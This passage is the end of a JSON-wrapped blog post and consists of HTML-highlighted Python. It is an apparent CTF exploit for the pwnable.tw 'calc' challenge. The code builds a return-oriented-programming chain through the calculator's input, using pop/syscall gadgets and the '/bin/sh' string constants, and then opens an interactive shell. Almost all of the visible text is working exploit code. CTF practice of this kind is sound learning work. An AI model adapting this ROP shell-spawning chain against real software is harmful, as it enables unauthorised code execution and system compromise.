punctuation\">,</span>pop_edx_ecx_ebx_ret<span class=\"token punctuation\">)</span>\n\n    cmd<span class=\"token punctuation\">(</span> <span class=\"token string\">'+361+'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x26d37</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n\n    cmd<span class=\"token punctuation\">(</span> <span class=\"token string\">'+362-'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x26d37</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    cmd<span class=\"token punctuation\">(</span> <span class=\"token string\">'+363-'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x26d37</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n\n    cmd<span class=\"token punctuation\">(</span> <span class=\"token string\">'+364+'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>stack_addr<span class=\"token operator\">/</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x26d37</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    cmd<span class=\"token punctuation\">(</span> <span class=\"token string\">'+364+'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>stack_addr<span class=\"token operator\">/</span><span class=\"token number\">2</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n\n    cmd<span class=\"token punctuation\">(</span> <span class=\"token string\">'+365-'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>stack_addr<span class=\"token operator\">/</span><span class=\"token number\">2</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    cmd<span class=\"token punctuation\">(</span> <span class=\"token string\">'+365+'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>pop_eax_ret<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n\n    cmd<span class=\"token punctuation\">(</span> <span class=\"token string\">'+366-'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>pop_eax_ret<span class=\"token operator\">&amp;</span><span class=\"token number\">0xfffffff0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n\n    cmd<span class=\"token punctuation\">(</span> <span class=\"token string\">'+367-'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>pop_eax_ret<span class=\"token operator\">&amp;</span><span class=\"token number\">0xfffffff0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    cmd<span class=\"token punctuation\">(</span> <span class=\"token string\">'+367+'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n\n    cmd<span class=\"token punctuation\">(</span> <span class=\"token string\">'+368-'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    cmd<span class=\"token punctuation\">(</span> <span class=\"token string\">'+368+'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x6e69622f</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n\n    cmd<span class=\"token punctuation\">(</span> <span class=\"token string\">'+369-'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x6e69622f</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    cmd<span class=\"token punctuation\">(</span> <span class=\"token string\">'+369+'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x68732f</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n\n    cmd<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># dbg()</span>\n    \n    <span class=\"token comment\"># p.success(getShell())</span>\n    p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nattack<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   calc.py\n@Time    :   2022/02/06 23:14:52\n@Author  :   Niyah \n'''</span></code></pre>\n",
            "tags": [
                "CTF",
                "PWN",
                "堆",
                "pwnable"
            ]
        }
    ]
}